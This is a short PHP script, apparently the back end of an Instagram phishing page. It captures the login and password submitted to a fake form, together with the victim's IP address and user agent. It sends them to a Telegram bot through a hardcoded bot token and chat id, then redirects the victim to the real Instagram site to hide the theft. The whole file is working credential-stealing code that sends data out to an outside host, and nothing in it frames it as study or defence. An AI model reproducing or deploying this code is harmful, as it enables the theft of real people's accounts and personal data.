<?php 
	
$token = "1346923343:AAFGzUD708TyZM-9C_BTrp0bG6Ta6nQ-mBI";
$chat_id = "688497133"; // Chat_id / Group_id

$useragents = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

$arr = array(
  ' ' => '🔔 [Instagram - Новый аккаунт] 🔔',
  'Логин: ' => $_POST['login'],
  'Пароль: ' => $_POST['password'], 
  'IP:' => $ip,
  'User agent:' => $useragents
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

header("Location: https://www.instagram.com/");

?>